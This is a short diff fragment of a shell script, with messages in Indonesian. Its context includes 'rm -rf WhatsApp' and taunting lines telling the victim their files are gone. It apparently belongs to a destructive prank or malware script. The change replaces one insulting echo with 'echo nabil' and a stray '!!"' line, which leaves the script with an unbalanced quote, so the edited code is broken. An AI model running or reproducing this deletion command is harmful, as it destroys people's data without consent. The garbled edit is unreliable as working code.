@@ -11,4 +11,5 @@ rm -rf WhatsApp
 echo "Mampus Semua File Lu Hilang"
 echo "Roni Tersakiti Ya Jadi Gini"
 echo "Mangkanya Jangan Macam Macam"
-echo "Fuck You !!"
+echo nabil
+!!"
